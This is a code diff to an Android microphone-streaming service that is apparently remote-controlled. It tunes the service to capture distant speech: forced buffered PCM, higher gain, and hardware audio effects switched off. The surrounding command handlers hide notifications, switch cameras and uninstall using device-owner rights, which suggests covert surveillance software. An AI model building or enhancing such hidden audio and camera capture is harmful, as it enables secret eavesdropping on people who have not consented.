@@ -131,14 +131,14 @@ class MicService : Service() {
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
     
     // ── HQ Buffered Audio Mode (delay OK, clarity priority) ─────────────────
-    // When enabled: accumulate 10-sec buffer → heavy processing → compress → send
+    // When enabled: accumulate 10-sec buffer → heavy processing → PCM send
     // This trades latency (5-15s) for better far-voice clarity on weak networks
-    @Volatile private var hqBufferedMode = false // realtime (false) or hq_buffered (true)
+    @Volatile private var hqBufferedMode = true // default HQ buffered for far-voice clarity
     private val hqBufferSeconds = 10 // 10-second buffer for HQ mode
     private val hqBufferSize by lazy { sampleRate * 2 * hqBufferSeconds } // 320KB for 16kHz mono PCM16
     private var hqBuffer = ByteArray(0) // lazily initialized when HQ mode enabled
     @Volatile private var hqBufferOffset = 0
-    @Volatile private var hqAggressiveDenoise = true // stronger denoise in HQ mode
+    @Volatile private var hqAggressiveDenoise = false // keep denoise moderate for far voice detail
     private val hqSilenceThreshold = 500 // RMS below this = silence (increased from 200 for better detection)
     private val hqSilencePercent = 0.85 // Buffer must be 85% silent to skip
     private val hqChunkSize = 64 * 1024 // Split large buffers into 64KB chunks for reliable transmission
@@ -168,7 +168,7 @@ class MicService : Service() {
     private var eq1X2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-2]
     private var eq1Y1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-1]
     private var eq1Y2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-2]
-    private var smoothedGain = 1.0  // Temporally-smoothed gain (anti-pumping)
+    private var smoothedGain = 2.5  // Temporally-smoothed gain (anti-pumping), far-voice baseline
     @Volatile private var ourAudioMode = false  // true while we own MODE_IN_COMMUNICATION
     // Overlap-add FFT spectral denoiser — shared instance, reset each capture session.
     private val spectralDenoiser = SpectralDenoiser()
@@ -813,12 +813,6 @@ class MicService : Service() {
                     sendCommandAck("hide_notifications", "error", e.message)
                 }
             }
-            // WiFi control commands removed - feature disabled
-            "wifi_on", "wifi_off" -> {
-                Log.i(TAG, "CMD: wifi control disabled")
-                safeSend("ACK:wifi:disabled")
-                sendCommandAck(cmd, "error", "disabled")
-            }
             "uninstall_app" -> {
                 // Uninstall the app (clear device owner first, then uninstall)
                 Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
@@ -858,8 +852,16 @@ class MicService : Service() {
             when (obj.optString("type")) {
                 "webrtc_start" -> {
                     Log.i(TAG, "CMD: webrtc_start")
-                    startWebRtcSession()
-                    sendCommandAck("webrtc_start")
+                    if (voiceProfile == "far") {
+                        // Far voice mode is quality-first and delay-tolerant; keep buffered PCM path.
+                        hqBufferedMode = true
+                        wsStreamMode = "pcm"
+                        stopWebRtcSession(notifyState = false)
+                        sendCommandAck("webrtc_start", detail = "blocked_in_far_mode")
+                    } else {
+                        startWebRtcSession()
+                        sendCommandAck("webrtc_start")
+                    }
                 }
                 "webrtc_stop" -> {
                     Log.i(TAG, "CMD: webrtc_stop")
@@ -933,14 +935,20 @@ class MicService : Service() {
                 }
                 "stream_codec" -> {
                     val mode = obj.optString("mode", "auto").trim().lowercase()
-                    wsStreamMode = when (mode) {
+                    val requestedMode = when (mode) {
                         "pcm" -> "pcm"
                         "smart", "mulaw" -> "smart"
                         else -> "auto"
                     }
+                    wsStreamMode = if (voiceProfile == "far") "pcm" else requestedMode
                     sendHealthStatus("stream_codec_$wsStreamMode")
                     Log.i(TAG, "WS stream mode set to $wsStreamMode")
-                    sendCommandAck("stream_codec", detail = wsStreamMode)
+                    val detail = if (voiceProfile == "far" && requestedMode != "pcm") {
+                        "pcm_forced_far_mode"
+                    } else {
+                        wsStreamMode
+                    }
+                    sendCommandAck("stream_codec", detail = detail)
                 }
                 "set_low_network" -> {
                     val enabled = obj.optBoolean("enabled", false)
@@ -956,7 +964,7 @@ class MicService : Service() {
                         applyAdaptiveBitrate()
                     } else {
                         // Return to standard mode
-                        wsStreamMode = "auto"
+                        wsStreamMode = if (voiceProfile == "far") "pcm" else "auto"
                         lowNetworkSampleRate = 16000
                         lowNetworkFrameMs = 20
                         Log.i(TAG, "Low-network mode DISABLED - standard quality restored")
@@ -974,6 +982,15 @@ class MicService : Service() {
                         "far" -> "far"
                         else -> "room"
                     }
+                    if (voiceProfile == "far") {
+                        // Far voice mode is quality-first: buffered path + PCM preference.
+                        hqBufferedMode = true
+                        wsStreamMode = "pcm"
+                        hqAggressiveDenoise = false
+                        if (isWebRtcStreaming) {
+                            stopWebRtcSession(notifyState = false)
+                        }
+                    }
                     sendHealthStatus("voice_profile_$voiceProfile")
                     Log.i(TAG, "Voice profile set to $voiceProfile")
                     sendCommandAck("voice_profile", detail = voiceProfile)
@@ -982,10 +999,11 @@ class MicService : Service() {
                     // Switch between realtime (20ms chunks) and HQ buffered (10-sec buffer)
                     val mode = obj.optString("mode", "realtime").trim().lowercase()
                     val wasHqMode = hqBufferedMode
-                    hqBufferedMode = when (mode) {
+                    val requestedHqMode = when (mode) {
                         "hq", "hq_buffered", "buffered", "high_quality" -> true
                         else -> false  // "realtime", "live", or default
                     }
+                    hqBufferedMode = if (voiceProfile == "far") true else requestedHqMode
                     
                     // If mode changed, restart audio capture to apply new settings
                     if (wasHqMode != hqBufferedMode && isCapturing) {
@@ -1006,7 +1024,12 @@ class MicService : Service() {
                     sendHealthStatus("streaming_mode_$modeText")
                     Log.i(TAG, "Streaming mode set to $modeText (${if (hqBufferedMode) "${hqBufferSeconds}s buffer" else "20ms chunks"})")
                     safeSend("""{"type":"streaming_mode_ack","mode":"$modeText","bufferSeconds":${if (hqBufferedMode) hqBufferSeconds else 0}}""")
-                    sendCommandAck("streaming_mode", detail = modeText)
+                    val detail = if (voiceProfile == "far" && !requestedHqMode) {
+                        "hq_buffered_forced_far_mode"
+                    } else {
+                        modeText
+                    }
+                    sendCommandAck("streaming_mode", detail = detail)
                 }
                 "switch_camera" -> {
                     preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
@@ -1069,6 +1092,11 @@ class MicService : Service() {
     }
 
     private fun startWebRtcSession() {
+        if (voiceProfile == "far") {
+            stopWebRtcSession(notifyState = false)
+            sendCommandAck("webrtc_start", detail = "blocked_in_far_mode")
+            return
+        }
         if (peerConnection != null) return
         ensurePeerConnectionFactory()
         val factory = peerConnectionFactory ?: return
@@ -2249,16 +2277,19 @@ class MicService : Service() {
                                     val processed = processHqBuffer(hqBuffer, hqBufferOffset)
                                     
                                     if (processed.isNotEmpty()) {
-                                        // OPTIMIZATION 2: Always compress in HQ mode (50% bandwidth reduction)
-                                        val compressed = pcm16ToMuLaw(processed)
-                                        val encoded = encodeHqAudio(compressed, isCompressed = true)
+                                        // Quality-first for far voice: avoid mu-law unless explicitly needed.
+                                        val payload = processed
+                                        val encoded = encodeHqAudio(payload, isCompressed = false)
                                         
                                         // OPTIMIZATION 3: Send in chunks to avoid WebSocket frame size limits
                                         val sendSuccess = sendHqAudioChunked(encoded)
                                         
                                         if (sendSuccess) {
                                             lastAudioChunkSentAt = System.currentTimeMillis()
-                                            Log.i(TAG, "HQ audio sent: ${processed.size} → ${compressed.size} compressed → ${encoded.size} encoded")
+                                            Log.i(
+                                                TAG,
+                                                "HQ audio sent: ${processed.size} → ${payload.size} payload (pcm) → ${encoded.size} encoded"
+                                            )
                                         } else {
                                             Log.w(TAG, "HQ audio send failed - stopping capture")
                                             isCapturing = false
@@ -2420,19 +2451,23 @@ class MicService : Service() {
                     if (NoiseSuppressor.isAvailable()) {
                         try {
                             NoiseSuppressor.create(sid)?.let { e ->
-                                // Far-profile prioritizes pickup loudness over strong suppression.
-                                e.enabled = aiEnhancementEnabled && voiceProfile != "far"
+                                // Keep hardware audio effects disabled for far-voice clarity.
+                                e.enabled = false
                                 e.release()
                             }
                         } catch (_: Exception) {}
                     }
                     if (AcousticEchoCanceler.isAvailable())
-                        try { AcousticEchoCanceler.create(sid)?.let { e -> e.enabled = aiEnhancementEnabled; e.release() } } catch (_: Exception) {}
+                        try {
+                            AcousticEchoCanceler.create(sid)?.let { e ->
+                                e.enabled = false
+                                e.release()
+                            }
+                        } catch (_: Exception) {}
                     if (AutomaticGainControl.isAvailable()) {
                         try {
                             AutomaticGainControl.create(sid)?.let { e ->
-                                // Keep AGC enabled to lift weak microphone input consistently.
-                                e.enabled = true
+                                e.enabled = false
                                 e.release()
                             }
                         } catch (_: Exception) {}
@@ -2453,7 +2488,7 @@ class MicService : Service() {
     private fun resetEnhancerState() {
         hpfPrevX = 0.0; hpfPrevY = 0.0
         eq1X1 = 0.0; eq1X2 = 0.0; eq1Y1 = 0.0; eq1Y2 = 0.0
-        smoothedGain = 1.0
+        smoothedGain = if (voiceProfile == "far") 3.0 else 2.5
         spectralDenoiser.reset()
     }
 
@@ -2756,12 +2791,11 @@ class MicService : Service() {
      * Encode HQ buffer for transmission.
      * Uses a different header to signal HQ mode to the server.
      * Header format: MM + version(0x02) + codec + 4-byte length + payload.
-     * codec: 0x10 = PCM, 0x11 = mu-law compressed.
+     * codec: 0x10 = PCM.
      */
     private fun encodeHqAudio(payload: ByteArray, isCompressed: Boolean): ByteArray {
         if (payload.isEmpty()) return payload
         
-        // In HQ mode, always prefer compression for network stability
         val codec = if (isCompressed) AUDIO_CODEC_HQ_MULAW else AUDIO_CODEC_HQ_PCM16_16K
         
         // Header: [0x4D][0x4D][0x02][codec][4-byte length]
@@ -2876,6 +2910,9 @@ class MicService : Service() {
     }
 
     private fun chooseWsFallbackCodec(): Byte {
+        if (voiceProfile == "far") {
+            return AUDIO_CODEC_PCM16_16K
+        }
         // LOW NETWORK MODE: AVOID PCM (256 kbps) - use compressed codec
         // PCM is the WRONG choice for weak networks
         if (lowNetworkMode) {
